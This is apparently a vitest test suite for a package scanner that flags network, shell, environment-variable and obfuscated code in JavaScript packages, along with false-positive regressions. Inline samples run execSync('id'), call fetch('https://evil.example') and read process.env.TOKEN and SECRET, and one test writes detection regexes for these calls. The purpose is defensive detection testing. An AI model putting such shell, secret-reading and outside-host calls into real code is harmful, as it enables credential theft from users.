import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { copyFileSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { expect, test } from "vitest";
import { capabilitiesSignal } from "./capabilities.js";

const here = dirname(fileURLToPath(import.meta.url));
const fixtures = join(here, "__fixtures__");

function dirWith(file: string): string {
  const d = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  copyFileSync(join(fixtures, file), join(d, "index.js"));
  return d;
}

test("clean code reports no risky capabilities", () => {
  const caps = capabilitiesSignal(dirWith("clean.js")).map((f) => f.capability);
  expect(caps).not.toContain("net");
  expect(caps).not.toContain("shell");
  expect(caps).not.toContain("env");
});

test("exfil code reports net, shell, and env", () => {
  const caps = capabilitiesSignal(dirWith("exfil.js")).map((f) => f.capability);
  expect(caps).toContain("net");
  expect(caps).toContain("shell");
  expect(caps).toContain("env");
});

test("obfuscated code is flagged", () => {
  const ids = capabilitiesSignal(dirWith("obfuscated.js")).map((f) => f.id);
  expect(ids).toContain("obfuscated");
});

test("each capability is reported at most once", () => {
  const d = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  writeFileSync(join(d, "a.js"), 'require("https").get("x")');
  writeFileSync(join(d, "b.js"), 'require("http").get("y")');
  const net = capabilitiesSignal(d).filter((f) => f.capability === "net");
  expect(net).toHaveLength(1);
});

test("capability tokens in comments and string literals are not flagged", () => {
  const d = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  writeFileSync(
    join(d, "index.js"),
    [
      "// this module talks about child_process and process.env in prose",
      'const help = "call fetch() or read process.env to configure";',
      "module.exports = help;",
    ].join("\n"),
  );
  expect(capabilitiesSignal(d)).toEqual([]);
});

test("capability tokens inside regex literals are not flagged (self-scan regression)", () => {
  // pkgvet's own detector source contains these tokens as regexes; a text-based
  // scanner flagged pkgvet (and any linter/scanner) as using every capability.
  const d = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  writeFileSync(
    join(d, "index.js"),
    [
      "const SHELL = /child_process|execSync|spawnSync/;",
      "const ENV = /process\\.env/;",
      "const NET = /fetch\\(|https?/;",
      "module.exports = { SHELL, ENV, NET };",
    ].join("\n"),
  );
  expect(capabilitiesSignal(d)).toEqual([]);
});

test("real require + call sites are still flagged", () => {
  const d = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  writeFileSync(
    join(d, "index.js"),
    [
      'const cp = require("child_process");',
      "cp.execSync(\"id\");",
      "fetch(\"https://evil.example\");",
      "const t = process.env.TOKEN;",
    ].join("\n"),
  );
  const caps = capabilitiesSignal(d).map((f) => f.capability);
  expect(caps).toContain("shell");
  expect(caps).toContain("net");
  expect(caps).toContain("env");
});

test("RegExp.prototype.exec is not mistaken for a shell command", () => {
  // `.exec()` is RegExp's method; child_process is the false friend. lodash and
  // many string libs use regex.exec heavily and must not be flagged shell.
  const d = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  writeFileSync(
    join(d, "index.js"),
    [
      "const re = /(\\d+)/g;",
      'let m; while ((m = re.exec("a1b2c3")) !== null) { /* ... */ }',
      "module.exports = m;",
    ].join("\n"),
  );
  expect(capabilitiesSignal(d).map((f) => f.capability)).not.toContain("shell");
});

test("a non-network .fetch() method call is not flagged net", () => {
  const d = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  writeFileSync(join(d, "index.js"), 'const rows = db.fetch("SELECT 1"); module.exports = rows;');
  expect(capabilitiesSignal(d).map((f) => f.capability)).not.toContain("net");
});

test("dynamic import() of child_process is flagged shell", () => {
  const d = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  writeFileSync(
    join(d, "index.js"),
    'export async function go() { const cp = await import("child_process"); return cp; }',
  );
  expect(capabilitiesSignal(d).map((f) => f.capability)).toContain("shell");
});

test("TypeScript declaration files (.d.ts) are not scanned", () => {
  // @types/* packages ship only .d.ts type declarations: no runtime behavior.
  const d = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  writeFileSync(
    join(d, "index.d.ts"),
    [
      "export declare function exec(cmd: string): void;",
      "export declare const env: typeof process.env;",
      "export declare function writeFileSync(p: string, data: string): void;",
    ].join("\n"),
  );
  expect(capabilitiesSignal(d)).toEqual([]);
});

test("plain minification (long line, ordinary identifiers) is not flagged obfuscated", () => {
  // AST analysis sees through minification, so a minified-but-clean bundle must
  // not be branded obfuscated; only hex-mangled / string-array obfuscation is.
  const d = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  const longLine = "module.exports=" + "function add(a,b){return a+b;}".repeat(60) + ";";
  writeFileSync(join(d, "index.js"), longLine);
  expect(capabilitiesSignal(d).map((f) => f.id)).not.toContain("obfuscated");
});

test("does not follow or fail on symlinks", () => {
  const root = mkdtempSync(join(tmpdir(), "pkgcheck-cap-"));
  const outside = mkdtempSync(join(tmpdir(), "pkgcheck-cap-outside-"));
  try {
    writeFileSync(join(outside, "outside.js"), "process.env.SECRET; fetch(\"https://example.com\");");
    symlinkSync(join(outside, "outside.js"), join(root, "linked.js"));
    symlinkSync(join(root, "missing.js"), join(root, "dangling.js"));

    expect(capabilitiesSignal(root)).toEqual([]);
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(outside, { recursive: true, force: true });
  }
});
